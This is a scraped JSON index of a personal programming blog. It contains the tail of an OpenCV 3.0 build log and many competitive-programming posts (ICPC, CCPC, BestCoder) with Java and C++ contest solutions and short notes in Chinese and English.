-fno-omit-frame-pointer -msse -msse2 -mno-avx -msse3 -mno-ssse3 -mno-sse4.1 -mno-sse4.2 -fvisibility=hidden -fvisibility-inlines-hidden -O3 -DNDEBUG -DNDEBUG– C flags (Debug): -fsigned-char -W -Werror=return-type -Werror=non-virtual-dtor -Werror=address -Werror=sequence-point -Wformat -Werror=format-security -Wmissing-declarations -Wmissing-prototypes -Wstrict-prototypes -Wundef -Winit-self -Wpointer-arith -Wshadow -Wsign-promo -Wno-narrowing -Wno-delete-non-virtual-dtor -Wno-unnamed-type-template-args -fdiagnostics-show-option -Wno-long-long -Qunused-arguments -Wno-semicolon-before-method-body -fno-omit-frame-pointer -msse -msse2 -mno-avx -msse3 -mno-ssse3 -mno-sse4.1 -mno-sse4.2 -fvisibility=hidden -fvisibility-inlines-hidden -g -O0 -DDEBUG -D_DEBUG– Linker flags (Release):– Linker flags (Debug):– Precompiled headers: NO– Extra dependencies: -framework OpenCL -framework Cocoa -framework QTKit -framework QuartzCore -framework AppKit – 3rdparty dependencies: libjpeg libwebp libpng libtiff libjasper IlmImf zlib ippicv– OpenCV modules:– To be built: hal core flann imgproc ml photo video imgcodecs shape videoio highgui objdetect superres ts features2d calib3d stitching videostab python2– Disabled: world– Disabled by dependency: - – Unavailable: cudaarithm cudabgsegm cudacodec cudafeatures2d cudafilters cudaimgproc cudalegacy cudaobjdetect cudaoptflow cudastereo cudawarping cudev java python3 viz– GUI:– QT: NO– Cocoa: YES– OpenGL support: NO – VTK support: NO– Media I/O:– ZLib: build (ver 1.2.8)– JPEG: build (ver 90)– WEBP: build (ver 0.3.1)– PNG: build (ver 1.5.12)– TIFF: build (ver 42 - 4.0.2)– JPEG 2000: build (ver 1.900.1)– OpenEXR: build (ver 1.7.1) – GDAL: NO– Video I/O:– DC1394 1.x: NO– DC1394 2.x: NO– FFMPEG: NO– codec: NO– format: NO– util: NO– swscale: NO– resample: NO– gentoo-style: NO– GStreamer: NO– OpenNI: NO– OpenNI PrimeSensor Modules: NO– OpenNI2: NO– PvAPI: NO– GigEVisionSDK: NO– QuickTime: NO– QTKit: YES– V4L/V4L2: NO/NO– XIMEA: NO – gPhoto2: NO– Other third-party libraries:– Use IPP: 8.2.1 [8.2.1]– at: /Users/semprathlon/opencv-3.0.0/3rdparty/ippicv/unpack/ippicv_osx– Use IPP Async: NO– Use Eigen: NO– Use TBB: NO– Use OpenMP: NO– Use GCD YES– Use Concurrency NO– Use C=: NO– Use pthreads for parallel for:– NO– Use Cuda: NO – Use OpenCL: YES– OpenCL:– Version: static– libraries: -framework OpenCL– Use AMDFFT: NO – Use AMDBLAS: NO– Python 2:– Interpreter: /usr/bin/python2.7 (ver 2.7.10)– Libraries: /usr/lib/libpython2.7.dylib (ver 2.7.10)– numpy: /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/numpy/core/include (ver 1.8.0rc1) – packages path: lib/python2.7/site-packages– Python 3: – Interpreter: NO– Python (for build): /usr/bin/python2.7– Java:– ant: NO– JNI: /System/Library/Frameworks/JavaVM.framework/Headers /System/Library/Frameworks/JavaVM.framework/Headers /System/Library/Frameworks/JavaVM.framework/Headers– Java wrappers: NO – Java tests: NO– Matlab: – mex: NO– Documentation:– Doxygen: NO – PlantUML: NO– Tests and samples:– Tests: YES– Performance tests: YES – C/C++ Examples: YES– Install path: /usr/local– cvconfig.h is in: /Users/semprathlon/opencv-3.0.0/release –– Configuring done– Generating doneCMake Warning: Manually-specified variables were not used by the project: BUILD_PYTHON_SUPPORT [/code]","link":"/posts/a0bdc8df/"},{"title":"ACM-ICPC Live Archive Regionals 2014 &gt;&gt; Asia - Shanghai","text":"Show All Problems Problems Soluble J - World Cup I - Defeat the Enemy B - Rotation It is merely a problem about induction and deduction that trouble us mostly…The (m+1)th team has to be considered specially.[code lang=”java”]/** Dec 1, 2015 8:20:12 PM PrjName: LA7147 @semprathlon/import java.io.;import java.util.*;public class Main { public static void main(String[] args) throws IOException{InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T--&amp;gt;0){ long n=in.nextLong(); long m=in.nextLong(); long a=in.nextLong(); long b=in.nextLong(); long c=in.nextLong(); if (a&amp;lt;c){ a^=c;c^=a;a^=c; } long ans1=Math.max(a, b)*(n-m-1); long ans2=Math.min(c, b)*(m-1); ans1+=Math.max(b*m, m/2*a+m/2*c+((m&amp;amp;1L)&amp;gt;0?Math.max(b, c):0)); ans2+=Math.min(b*(n-m), (n-m)/2*a+(n-m)/2*c+((n-m&amp;amp;1L)&amp;gt;0?Math.min(b, a):0)); out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+ans1+&amp;quot; &amp;quot;+ans2); } out.flush(); out.close(); }[/code] Bipartite graph matching turns out to exceed the time limit.Use greedy strategy as estimated.Reflecting back upon the on-site period,the sort comparator can be considered correct.But the improper linear data structure failed to perform a “delete” operation.Now use multiset instead.Note that the optimal result doesn’t necessarily have to do with that earlier or later one of the tribes battles.[code language=”cpp”]/* File: main.cpp Author: semprathlon* Created on December 2, 2015, 7:31 PM*/ #include &lt;cstdio&gt; #include &lt;cstdlib&gt; #include &lt;iostream&gt; #include &lt;algorithm&gt; #include &lt;set&gt; using namespace std; typedef pair&lt;int,int&gt; pr;const int maxn=100010; multiset&lt;int&gt; st; pr c[maxn],e[maxn]; bool cmp1(const pr &amp;a,const pr &amp;b){ return a.first&gt;b.first;} bool cmp2(const pr &amp;a,const pr &amp;b){ return a.second&gt;b.second;} int main() { int T,cas=0; scanf(&quot;%d&quot;,&amp;T); while(T–){ int n,m; scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i=0;i&lt;n;i++){ int a,d; scanf(&quot;%d%d&quot;,&amp;a,&amp;d); c[i]=std::make_pair(a,d); } for(int i=0;i&lt;m;i++){ int a,d; scanf(&quot;%d%d&quot;,&amp;a,&amp;d); e[i]=std::make_pair(a,d); } std::sort(c,c+n,cmp1); std::sort(e,e+m,cmp2);// for(int i=0;i&lt;n;i++) printf(&quot;%d,%d\\n&quot;,c[i].first,c[i].second);// for(int i=0;i&lt;m;i++) printf(&quot;%d,%d\\n&quot;,e[i].first,e[i].second); int ans=n; st.clear(); for(int i=0,j=0;i&lt;m;i++){ for(;j&lt;n&amp;&amp;c[j].first&gt;=e[i].second;j++) st.insert(c[j].second); if (st.empty()){ ans=-1;break; } multiset&lt;int&gt;::iterator it=st.upper_bound(e[i].first); if (it==st.end()){ st.erase(st.begin()); ans–; } else st.erase(it); } printf(&quot;Case #%d: %d\\n&quot;,++cas,ans); } return 0;} [/code] Terrific mistake occurred when reading the description of the problem.The path only add some value to the grids adjacent to it.Also,pay attention to the square sum.[code lang=”java”]/** Dec 4, 2015 9:03:20 PM PrjName: LA7139 @semprathlon/import java.io.;import java.util.*;public class Main { static int[][] g; static void add(int r,int c1,int c2,int v){ g[r][c1]+=v; g[r][c2]-=v; } static void debug(int n,int m,PrintWriter out){ for(int i=1;i&amp;lt;=n+1;i++){ for(int j=1;j&amp;lt;=m+1;j++) out.print(g[i][j]+&amp;quot; &amp;quot;); out.println(); } } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T--&amp;gt;0){ int n=in.nextInt(); int m=in.nextInt(); int k=in.nextInt(); g=new int[n+2][m+2]; int x=1,y=1; for(int i=1;i&amp;lt;=k;i++){ String s=in.next(); int l=in.nextInt(); switch (s.charAt(0)) { case &apos;R&apos;: add(x,y,y+l,1);y+=l;break; case &apos;L&apos;: add(x, y-l, y, -1);y-=l;break; case &apos;U&apos;: x-=l;break; case &apos;D&apos;: x+=l;break; } } long ans=0; for(int i=1;i&amp;lt;=n;i++) for(int j=1;j&amp;lt;=m;j++){ g[i][j]+=g[i][j-1]; g[i][j]+=g[i-1][j]; g[i][j]-=g[i-1][j-1]; ans+=g[i][j]*g[i][j]; } // debug(n, m, out); out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+ans); } out.flush(); out.close(); } }[/code]","link":"/posts/3d365c02/"},{"title":"Cannot create generic array of     in Java?","text":"See Stackoverflow","link":"/posts/d87a81b7/"},{"title":"Mac,Windows双系统时间同步解决办法","text":"修【tiao】正【jiao】Windows处理BIOS时间的方式","link":"/posts/7a5679c1/"},{"title":"BestCoder","text":"Solved Problems SDOI Reorder the Books SDOI[code lang=”java”]/** 2015年10月10日 下午6:54:59 PrjName:Bc59-01 @ Semprathlon/import java.io.;import java.util.*;public class Main { static Person[] ps; static ArrayList&lt;Person&gt; li=new ArrayList&lt;Person&gt;(); public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ int n=in.nextInt(); int m=in.nextInt(); float x1=0,x2=0; int female=0,h=0; ps=new Person[n]; for(int i=0;i&amp;lt;n;i++){ ps[i]=new Person(in.next(), in.next(), in.nextInt(), in.nextInt()); female+=ps[i].sex; if (ps[i].sex==1&amp;amp;&amp;amp;h==0) h=i; x1=Math.max(x1, ps[i].s1); x2=Math.max(x2, ps[i].s2); } li.clear(); for(int i=0;i&amp;lt;n;i++){ ps[i].s1*=300;ps[i].s1/=x1; ps[i].s2*=300;ps[i].s2/=x2; ps[i].s=ps[i].s1*(float)0.3+ps[i].s2*(float)0.7; if (female&amp;gt;0){ if (ps[i].s&amp;gt;ps[h].s&amp;amp;&amp;amp;ps[i].sex==1) h=i; } else if (ps[i].s&amp;gt;ps[h].s) h=i; //li.add(ps[i]); } out.println(&amp;quot;The member list of Shandong team is as follows:&amp;quot;); Person p0=new Person(); if (female&amp;gt;0){ // out.println(li.get(h).name); p0=new Person(ps[h]); ps[h].s=-1; m--; } Arrays.sort(ps, new Person.comp()); li.clear(); for(int i=0;i&amp;lt;m;i++) li.add(ps[i]); if (female&amp;gt;0){ li.add(p0);m++; } ps=li.toArray(new Person[0]); Arrays.sort(ps, new Person.comp()); for(int i=0;i&amp;lt;m;i++) out.println(ps[i].name); } out.flush(); out.close(); }}class Person{ String name; int sex; float s1,s2,s; Person(){} Person(Person p){ name=new String(p.name); sex=p.sex; s1=p.s1; s2=p.s2; s=p.s; } Person(String nm,String sx,int _s1,int _s2){ name=new String(nm); if (sx.charAt(0)==&apos;m&apos;) sex=0; else sex=1; s1=_s1;s2=_s2; } void debug(PrintWriter out){ out.println(name+&amp;quot;\\t&amp;quot;+sex+&amp;quot;\\t&amp;quot;+s); } static class comp implements Comparator&lt;Person&gt; { public int compare(Person p1,Person p2){ return -Float.compare(p1.s, p2.s); } }}[/code] Reorder the Books思索再三，竟然连充分条件、必要条件都没找准，[code lang=”java”]/** Oct 13, 2015 8:55:41 PM PrjName:hdu5500 @author Semprathlon/import java.io.;import java.util.*;public class Main { static int[] a; public static void main(String[] args) throws IOException{InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ int n=in.nextInt(); a=new int[n+1]; for(int i=1;i&amp;lt;=n;i++) a[in.nextInt()]=i; int ans=0; // if (a[n]!=n&amp;&amp;a[n]!=1) ans++;int k=a[n]; for(int i=n;i&amp;gt;1;i--) if (a[i-1]&amp;lt;k){ k=a[i-1];n--; } else break; // out.println(n); for(int i=n-1;i&amp;gt;1;i--){ if (a[i]==1) continue; boolean need=false; for(int j=1;j&amp;lt;i;j++) if (a[j]&amp;gt;a[i]) need|=true; for(int j=i+1;j&amp;lt;=n;j++) if (a[j]&amp;lt;a[i]) need|=true; if (need){ ans++; for(int j=1;j&amp;lt;=n;j++) if (a[j]&amp;lt;a[i]) a[j]++; a[i]=1; } } if (a[1]!=1) ans++; out.println(ans); } out.flush(); out.close(); }}[/code]观察、归纳后可以优化到最简，[code lang=”java”]public class Main { static int[] a; public static void main(String[] args) throws IOException{InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ int n=in.nextInt(); a=new int[n+1]; for(int i=1;i&amp;lt;=n;i++) a[in.nextInt()]=i; int ans=0; int k=a[n],h=0; for(int i=n;i&amp;gt;1;i--){ if (a[i-1]&amp;gt;k){ ans++; a[i-1]=h--; } k=a[i-1]; } if (a[1]!=h+1) ans++; out.println(ans); } out.flush(); out.close(); } }[/code]","link":"/posts/561c3d53/"},{"title":"Bestcoder","text":"Solved Problems Numbers Game Subtrees Numbers可能需要两个特判？[code lang=”java”]/** Oct 31, 2015 7:01:33 PM PrjName: Bc61-01 @semprathlon/import java.io.;import java.util.*;public class Main { static int maxl=1001; static int[] f=new int[maxl]; static Vector&lt;Integer&gt; v=new Vector&lt;Integer&gt;(); public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); while(in.nextLine()!=null){ int n=in.nextInt(); // if (n&lt;1) continue; boolean has1=false,has2=false,has=false;; Arrays.fill(f, 0); for(int i=1;i&amp;lt;=n;i++){ int k=in.nextInt(); f[k]++; if (f[k]&amp;gt;1&amp;amp;&amp;amp;k&amp;gt;0) has1=true; if (f[k]&amp;gt;2) has2=true; } v.clear(); for(int i=0;i&amp;lt;maxl;i++) if (f[i]&amp;gt;0) v.add(i); // for(Integer e:v.toArray(new Integer[0]))// out.print(e+&quot; &quot;); if (v.get(0)==0&amp;amp;&amp;amp;has1||has2){ out.println(&amp;quot;YES&amp;quot;);continue; } Integer[] a=v.toArray(new Integer[0]); for(int i=0;i&amp;lt;a.length-1;i++) if (!has) for(int j=a.length-1;j&amp;gt;i;j--){ int k=Arrays.binarySearch(a, a[j]-a[i]); if (k&amp;gt;i&amp;amp;&amp;amp;k&amp;lt;j){ has=true;break; } } out.println(has?&amp;quot;YES&amp;quot;:&amp;quot;NO&amp;quot;); } out.flush(); out.close(); }}[/code] Game各种分类讨论，但就是要写好最边缘的特判。。。[code lang=”java”]/** Oct 31, 2015 7:28:53 PM PrjName: Bc61-02 @semprathlon/import java.io.;import java.util.*;public class Main { public static void main(String[] args) throws IOException{InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); while(in.nextLine()!=null){ int n=in.nextInt(); int s=in.nextInt(); int t=in.nextInt(); if (s==t){ out.println(n&amp;gt;1?-1:0);continue; } if (t==1){ if (s==n) out.println(0); else if (s==2) out.println(1); else out.println(2); } else if (t==n){ if (s==1) out.println(0); else if (s==n-1) out.println(1); else out.println(2); } else{ if (s==t+1||s==t-1||s==1||s==n) out.println(1); else out.println(2); } } out.flush(); out.close(); } }[/code] Subtrees有些查找行为显然拖慢时间以致TLE。。。有一个重要优化是从小到大枚举子树大小而不是相反方向；[code lang=”java”]/** Nov 7, 2015 10:31:31 PM PrjName: hdu5524-3 @semprathlon/import java.io.;import java.util.*;public class Main { static int maxn=64; static long[] p2; static HashSet&lt;Long&gt; st=new HashSet&lt;Long&gt;(); static PrintWriter out=new PrintWriter(System.out); static void solve(long n){ if (n==0L) return; st.add(n); if (n==1L) return; long f; for(f=1L;;f=f&amp;lt;&amp;lt;1|1L) if ((f&amp;gt;&amp;gt;1)&amp;lt;=n-1L-f&amp;amp;&amp;amp;(f&amp;lt;&amp;lt;1)&amp;gt;=n-1L-f) break; solve(f); if ((f&amp;lt;&amp;lt;1|1)!=n) solve(n-1-f); } static void init(){ p2=new long[maxn]; p2[0]=1L; for(int i=1;i&amp;lt;maxn;i++){ p2[i]=p2[i-1]&amp;lt;&amp;lt;1; p2[i-1]--; } } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); init(); while(in.nextLine()!=null){ long n=in.nextLong(); st.clear();solve(n); out.println(st.size()); } out.flush(); out.close(); } }[/code]","link":"/posts/97dd1257/"},{"title":"Bestcoder","text":"Solved Problems Clarke and food Clarke and five-pointed star Clarke and food非常轻易地完成填充。 Clarke and five-pointed star辛辛苦苦地敲完了又挂了。。。 我这里独立思考得到的结论是：以五角星的一个顶点为参考点，则该点必在其他四点所构成的四边形之外，且其他四点相对于该点所成的张角之和是确定的；尽管随着所取的四个点的顺序不同会有不同的值，但也仅有三种情况。可是测样例数据时不知怎的多加了一个待判值，结果WA了[code lang=”java”]/** Nov 14, 2015 7:35:56 PM PrjName: Bc62-02 @semprathlon/import java.io.;import java.util.*;public class Main { static Point[] pt=new Point[5]; static PrintWriter out=new PrintWriter(System.out); static boolean check1(){ return !Point.isPointInRect(pt[0], pt[1], pt[2], pt[3], pt[4])&amp;amp;&amp;amp; !Point.isPointInRect(pt[1], pt[2], pt[3], pt[4], pt[0])&amp;amp;&amp;amp; !Point.isPointInRect(pt[2], pt[3], pt[4], pt[0], pt[1])&amp;amp;&amp;amp; !Point.isPointInRect(pt[3], pt[4], pt[0], pt[1], pt[2])&amp;amp;&amp;amp; !Point.isPointInRect(pt[4], pt[0], pt[1], pt[2], pt[3]); } static boolean check0(Point p,Point a,Point b,Point c,Point d){ double v1=Math.acos(-1.0)/5.0,v2=v1*2.0,v3=v1*3.0; double angle=Vector.angle2(p, a, b)+Vector.angle2(p, b, c)+Vector.angle2(p, c, d); angle=Math.abs(angle); // out.println(v1+&quot;,&quot;+v2+&quot;,&quot;+v3+&quot;,&quot;+angle); return Point.dcmp(angle-v1)==0||Point.dcmp(angle-v2)==0||Point.dcmp(angle-v3)==0; } static boolean check2(){ return check0(pt[0], pt[1], pt[2], pt[3], pt[4])&amp;amp;&amp;amp; check0(pt[1], pt[2], pt[3], pt[4], pt[0])&amp;amp;&amp;amp; check0(pt[2], pt[3], pt[4], pt[0], pt[1])&amp;amp;&amp;amp; check0(pt[3], pt[4], pt[0], pt[1], pt[2])&amp;amp;&amp;amp; check0(pt[4], pt[0], pt[1], pt[2], pt[3]); } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); int T=in.nextInt(); while(T--&amp;gt;0){ for(int i=0;i&amp;lt;5;i++) pt[i]=new Point(in.nextDouble(), in.nextDouble()); if (pt[0].equals(pt[1])&amp;amp;&amp;amp;pt[1].equals(pt[2])&amp;amp;&amp;amp;pt[2].equals(pt[3])&amp;amp;&amp;amp;pt[3].equals(pt[4])&amp;amp;&amp;amp;pt[4].equals(pt[0])){ out.println(&amp;quot;Yes&amp;quot;);continue; } out.println(check2()?&amp;quot;Yes&amp;quot;:&amp;quot;No&amp;quot;); } out.flush(); out.close(); }}[/code]","link":"/posts/97dd1257/"},{"title":"2015 CCPC - 南阳站","text":"这是一场炼狱般的较量。无心游玩，艰苦奋斗。 现场发挥 已解决题目 L - Huatuo’s Medicine A - Secrete Master Plan A - Secrete Master Plan C - The Battle of Chibi H - Sudoku D - Pick The Sticks D - Pick The Sticks(封榜后) G - Ancient Go H - Sudoku Ranklist L - Huatuo’s Medicine L - Huatuo’s Medicine认真阅读题目，并输出n*2-1. A - Secrete Master Plan将占据2*2点阵的四个整数进行旋转操作，写法较为多样化。考验编码能力，准确、严谨、高效。消除毒代码。 inline LL fx(LL a1,LL a2,LL a3,LL a4){ return a1*1000000000+a2*1000000+a3*1000+a4; } int main() { int T,cas=0; cin&gt;&gt;T; while(T--){ int a1,a2,a3,a4; cin&gt;&gt;a1&gt;&gt;a2&gt;&gt;a3&gt;&gt;a4; LL v0=fx(a1,a2,a4,a3); cin&gt;&gt;a1&gt;&gt;a2&gt;&gt;a3&gt;&gt;a4; LL v1=fx(a1,a2,a4,a3); LL v2=fx(a2,a4,a3,a1); LL v3=fx(a4,a3,a1,a2); LL v4=fx(a3,a1,a2,a4); //cout&lt;&lt;v0&lt;&lt;','&lt;&lt;v1&lt;&lt;','&lt;&lt;v2&lt;&lt;','&lt;&lt;v3&lt;&lt;','&lt;&lt;v4&lt;&lt;endl; if (v0==v1||v0==v2||v0==v3||v0==v4) cout&lt;&lt;\"Case #\"&lt;&lt;++cas&lt;&lt;\": \"&lt;&lt;\"POSSIBLE\"&lt;&lt;endl; else cout&lt;&lt;\"Case #\"&lt;&lt;++cas&lt;&lt;\": \"&lt;&lt;\"IMPOSSIBLE\"&lt;&lt;endl; } return 0; } H - Sudoku简化的数独，规模为4*4，需填入1~4的整数。 /* * File: main.cpp * Author: semprathlon * * Created on November 8, 2015, 2:53 PM */ #include &lt;cstdlib&gt; #include &lt;ios&gt; #include &lt;iostream&gt; using namespace std; char str[5]; int a[16],res[16],f[12]; bool ans; void add(int x,int y,int v){ a[x*4+y]=v; v=1&lt;&lt;(v-1); f[x]|=v; f[4+y]|=v; f[8+(x&gt;1?2:0)+(y&gt;1?1:0)]|=v; } void del(int x,int y,int v){ a[x*4+y]=0; v=1&lt;&lt;(v-1); f[x]&amp;=~v; f[4+y]&amp;=~v; f[8+(x&gt;1?2:0)+(y&gt;1?1:0)]&amp;=~v; } bool has(int x,int y,int v){ v=1&lt;&lt;(v-1); return (f[x]&amp;v)||(f[4+y]&amp;v)||(f[8+(x&gt;1?2:0)+(y&gt;1?1:0)]&amp;v); } bool check(){ for(int i=0;i&lt;12;i++) if (f[i]&lt;15) return 0; return 1; } void solve(int x,int y){ if (check()){ for(int i=0;i&lt;16;i++) res[i]=a[i]; ans=1; return; } for(int i=x*4+y;i&lt;16;i++) if (!a[i]&amp;&amp;!ans) for(int k=1;k&lt;=4;k++) if (!has(i/4,i%4,k)) { add(i/4,i%4,k); solve(i/4,i%4); del(i/4,i%4,k); } } int main(int argc, char** argv) { int T,cas=0; cin&gt;&gt;T; while(T--){ fill(f,f+12,0); for(int i=0;i&lt;4;i++){ cin&gt;&gt;str; for(int j=0;j&lt;4;j++) if (str[j]=='*') a[i*4+j]=0; else add(i,j,str[j]-'0'); } ans=0; solve(0,0); printf(\"Case #%d:\\n\",++cas); for(int i=0;i&lt;4;i++){ for(int j=0;j&lt;4;j++) cout&lt;&lt;res[i*4+j]; cout&lt;&lt;endl; } } return 0; } D - Pick The Sticks从若干个已知体积（即长度）与价值的物品中取一些装入已知长度的线性横杆状容器中使总价值最大。其长度和可超过容器长度，但是需保证每件物品的重心均在容器内。设计巧妙的01背包问题变种，但是一开始当成贪心做了，之后又遗漏了一些转移方向，以至于拖到了封榜后。思想是在原背包基础上新增一个状态参数，取值范围为{0,1,2}.0表示不允许两端有物体超出。1表示允许某一端有物体超出。2表示两端都可以有物体超出。 /** * Dec 5, 2015 5:21:06 PM * PrjName: hdu5543 * @semprathlon */ import java.io.*; import java.util.*; public class Main { static int a[]; static long v[],f[][]; public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T--&gt;0){ int n=in.nextInt(); int l=in.nextInt();l&lt;&lt;=1; long maxv=0; a=new int[n+1]; v=new long[n+1]; f=new long[l+1][3]; for(int i=1;i&lt;=n;i++){ a[i]=in.nextInt(); v[i]=in.nextLong(); a[i]&lt;&lt;=1; maxv=Math.max(maxv, v[i]); } for(int i=1;i&lt;=n;i++) for(int j=l;j&gt;=0;j--){ if (j&gt;=a[i]) for(int k=0;k&lt;3;k++) f[j][k]=Math.max(f[j][k], f[j-a[i]][k]+v[i]); if (j&gt;=(a[i]&gt;&gt;1)){//可能遗漏 f[j][1]=Math.max(f[j][1], f[j-(a[i]&gt;&gt;1)][0]+v[i]); f[j][2]=Math.max(f[j][2], f[j-(a[i]&gt;&gt;1)][1]+v[i]); } } long ans=maxv; ans=Math.max(ans, f[l][0]); ans=Math.max(ans, f[l][1]); ans=Math.max(ans, f[l][2]); out.println(\"Case #\"+(++cas)+\": \"+ans); } out.flush(); out.close(); } } G - Ancient Go阅读理解，试根据题中所给规则，判断当前围棋对局中黑方(x)再下一子后能否实现“吃子”。当白方棋子(o)形成的某一连通块完全被对方包围（考虑4个方向）而没有与空点相邻时，就会被kill.比赛中解题时，问题重点始终放在黑子上；枚举黑子可下的位置并填充颜色、验证。但是无解。其实切入点应该转移到白子上；选定一个白连通块，查看包围它的黑子个数，判断是否即将封闭。 const int maxn=9; const int dir[4][2]={ {-1,0},{1,0},{0,1},{0,-1}}; char s[maxn]; int g[maxn][maxn]; bool vis[maxn][maxn]; inline bool can(int x,int y){ return x&gt;=0&amp;&amp;x&lt;maxn&amp;&amp;y&gt;=0&amp;&amp;y&lt;maxn; } int dfs(int x0,int y0){ int res=0; for(int k=0;k&lt;4;k++){ int x=x0+dir[k][0]; int y=y0+dir[k][1]; if (!can(x,y)||vis[x][y]) continue; vis[x][y]=1; if (g[x][y]==0){ res++; continue; } if (g[x][y]==1) res+=dfs(x,y); } return res; } void clrvis(){ for(int i=0;i&lt;maxn;i++) for(int j=0;j&lt;maxn;j++) vis[i][j]=0; } void clrvis2(){ for(int i=0;i&lt;maxn;i++) for(int j=0;j&lt;maxn;j++) if (!g[i][j]) vis[i][j]=0; } int main() { int T,cas=0; cin&gt;&gt;T; while(T--){ for(int i=0;i&lt;maxn;i++){ scanf(\"%s\",s); for(int j=0;j&lt;maxn;j++) if (s[j]=='.') g[i][j]=0; else if (s[j]=='x') g[i][j]=2; else if (s[j]=='o') g[i][j]=1; } bool ans=0; clrvis(); for(int i=0;i&lt;maxn;i++) if (!ans) for(int j=0;j&lt;maxn;j++) if (!vis[i][j]&amp;&amp;g[i][j]==1){ clrvis2(); vis[i][j]=1; int tmp=dfs(i,j); if (tmp==1){ ans=1;break; } } cout&lt;&lt;\"Case #\"&lt;&lt;(++cas)&lt;&lt;\": \"&lt;&lt;(ans?\"Can kill in one move!!!\":\"Can not kill in one move!!!\")&lt;&lt;endl; } return 0; } C - The Battle of Chibipublic class Main { static int[][] f; static int[] a; final static int mod=1000000007; public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&gt;0){ int n=in.nextInt(); int m=in.nextInt(); a=new int[n+1]; f=new int[n+1][m+1]; for(int i=1;i&lt;=n;i++) a[i]=in.nextInt(); for(int i=1;i&lt;=n;i++){ f[i][1]=1; for(int j=1;j&lt;=Math.min(i, m);j++){ for(int k=j-1;k&lt;i;k++) if (a[i]&gt;a[k]){ f[i][j]+=f[k][j-1]; } } } int ans=0; for(int i=m;i&lt;=n;i++) ans=(ans+f[i][m])%mod; out.println(ans); } out.flush(); out.close(); } } 三层循环超时，尝试消去一维。 /** * Mar 17, 2016 10:16:51 PM * PrjName: hdu5542 * @semprathlon */ import java.io.*; import java.util.*; public class Main { static int[][] f; static int[] a,b; final static int mod=1000000007; static int lowbit(int x){ return x&amp;(-x); } static void add(int x,int y,int v,int sz){ while(x&lt;sz){ f[x][y]+=v; f[x][y]%=mod; x+=lowbit(x); } } static int sum(int x,int y){ int res=0; while(x&gt;0){ res+=f[x][y]; res%=mod; x-=lowbit(x); } return res; } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T--&gt;0){ int n=in.nextInt(); int m=in.nextInt(); a=new int[n+1]; f=new int[n+1][m+1]; for(int i=1;i&lt;=n;i++) a[i]=in.nextInt(); b=a.clone(); Arrays.sort(b); for(int i=1;i&lt;=n;i++) a[i]=Arrays.binarySearch(b, a[i]); for(int i=1;i&lt;=n;i++){ // f[i][1]=1; add(a[i], 1, 1, n+1); for(int j=2;j&lt;=Math.min(i, m);j++){ int tmp=sum(a[i]-1,j-1); add(a[i], j, tmp, n+1); /*for(int k=0;k&lt;i;k++) if (a[i]&gt;a[k]){ f[i][j]+=f[k][j-1]; f[i][j]%=mod; }*/ //f[i][j]%=mod; } } /*for(int i=1;i&lt;=n;i++){ for(int j=1;j&lt;=m;j++) out.print(f[i][j]+\" \"); out.println(); }*/ /*int ans=0; for(int i=1;i&lt;=n;i++) ans=(ans+f[i][m])%mod;*/ out.println(\"Case #\"+(++cas)+\": \"+sum(n, m)); } out.flush(); out.close(); } }","link":"/posts/1cd15e86/"},{"title":"Hdu 1717 （循环）小数化分数","text":"循环小数的特性值得学习！","link":"/posts/122a64fc/"},{"title":"BestCoder","text":"Solved Problems To be solved Numbers Array Sum Numbers没话可说。 Sum基础一维DP的变异[code lang=”java”]/** Nov 28, 2015 8:04:23 PM PrjName: Bc64-02 @semprathlon/import java.io.;import java.util.*;public class Main { static int[] a,s,f; static int fn(int x){return (1890*x+143)%10007; } public static void main(String[] args) throws IOException{InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); while(in.nextLine()!=null){ int n=in.nextInt(); a=new int[n+1]; s=new int[n+1]; f=new int[n+1]; for(int i=1;i&amp;lt;=n;i++){ a[i]=in.nextInt(); s[i]=s[i-1]+a[i]; } int ans=s[n]; for(int i=1;i&amp;lt;=n;i++){ f[i]=Math.max(f[i-1]+fn(a[i]), s[i]); ans=Math.max(ans, f[i]+s[n]-s[i]); } out.println(ans); } out.flush(); out.close(); } }[/code]","link":"/posts/561c3d53/"},{"title":"EC-final赛前一周","text":"为信仰充值，与神犇赛码！年度最终决战，剑不出鞘更待何时？下周末双日，12.12～13，2015 ACM/ICPC EC-final 上海大学站，蓄势待发！全力备战","link":"/posts/9876eef3/"},{"title":"BestCoder","text":"Solved Problems ZYB’s Biology ZYB’s Game ZYB’s Premutation ZYB’s Biology平淡无奇的匹配 ZYB’s Game惊异于“最优策略”的选取，最终结果竟与奇偶性挂钩。 ZYB’s Premutation常规题型，旧题重演，竟然跑偏了。半年多前的某基础题的逆向问题。同样用线段树或树状数组解决，关键是实现查找第k大的数、删除第k大的数并维护。也有基于查询数的更抽象高效的解法。树状数组：[code lang=”java”]/** Dec 5, 2015 8:39:53 PM PrjName: 1205-03-2 @semprathlon/import java.io.;import java.util.*;public class Main { static int[] a,f; static BIT tr; static HashSet&lt;Integer&gt; st=new HashSet&lt;Integer&gt;(); static void print(int[] a,PrintWriter out){ int n=a.length-1; for(int 